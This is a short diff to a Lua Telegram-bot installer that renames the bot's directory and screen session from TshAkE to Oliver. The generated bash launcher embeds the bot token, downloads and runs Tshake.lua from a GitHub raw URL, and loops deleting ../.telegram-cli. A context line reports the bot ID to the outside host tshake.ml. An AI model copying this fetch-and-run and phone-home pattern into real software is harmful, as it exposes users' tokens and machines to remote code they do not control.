@@ -68,7 +68,7 @@ http.request("http://tshake.ml/add/?id="..database:get(Server_Tshake.."Id_Tshake
 local RunTshake = io.open("Tshake", 'w')
 RunTshake:write([[
 #!/usr/bin/env bash
-cd $HOME/TshAkE
+cd $HOME/Oliver
 token="]]..database:get(Server_Tshake.."Token_Tshake")..[["
 rm -fr Tshake.lua
 wget "https://raw.githubusercontent.com/tshakeab/Tshake/master/Tshake.lua"
@@ -81,11 +81,11 @@ RunTshake:close()
 local RunTs = io.open("ts", 'w')
 RunTs:write([[
 #!/usr/bin/env bash
-cd $HOME/TshAkE
+cd $HOME/Oliver
 while(true) do
 rm -fr ../.telegram-cli
-screen -S TshAkE -X kill
-screen -S TshAkE ./Tshake
+screen -S Oliver -X kill
+screen -S Oliver ./Oliver
 done
 ]])
 RunTs:close()
